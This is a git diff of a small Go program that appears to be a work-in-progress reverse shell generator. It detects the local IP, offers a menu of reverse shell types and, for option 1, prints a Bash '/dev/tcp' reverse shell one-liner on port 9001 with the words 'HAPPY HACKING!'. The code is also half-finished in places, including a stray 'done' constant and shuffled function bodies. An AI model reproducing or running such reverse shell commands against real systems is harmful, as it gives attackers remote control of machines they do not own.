@@ -10,7 +10,7 @@ import (
 )
 
 /*func lstOfRevShells() {
-const bashS =
+const bashS = done
 const phpS =
 const javaS =
 const perlS =
@@ -28,12 +28,9 @@ func getOutboundIP() net.IP {
 	defer conn.Close()
 	localAddr := conn.LocalAddr().(*net.UDPAddr)
 	fmt.Println(localAddr.IP)
-	return localAddr.IP
-}
-
-func a() {
+	//get local ip part is over and the lexical part begins
 	const intMessage = "Hello user, let us create so reverse shells! What we going to choose today?"
-	const listOfShells = "Bash Reverse Shell\nPHP Reverse Shell.\nJava Reverse Shell.\n" +
+	const listOfShells = "1. Bash Reverse Shell\nPHP Reverse Shell.\nJava Reverse Shell.\n" +
 		"Perl Reverse Shell.\nPython Reverse Shell.\nRuby Reverse Shell.\nNetcat Reverse Shell."
 	fmt.Println(intMessage, "\n"+listOfShells)
 	fmt.Println("So what shell we going to take? ")
@@ -41,7 +38,17 @@ func a() {
 	var choosenS string
 	// Taking input from user
 	fmt.Scanln(&choosenS)
-	fmt.Println("you took", choosenS, "shell")
+	fmt.Println("you took number", choosenS, "shell\nHere is your shell, just copy it, HAPPY HACKING!")
+	var ipa = localAddr.IP
+	if choosenS == "1" {
+		fmt.Print("sh -i >& /dev/tcp/", ipa, "/9001 0>&1\n")
+
+	}
+	return localAddr.IP
+}
+
+func a() {
+
 }
 
 func main() {
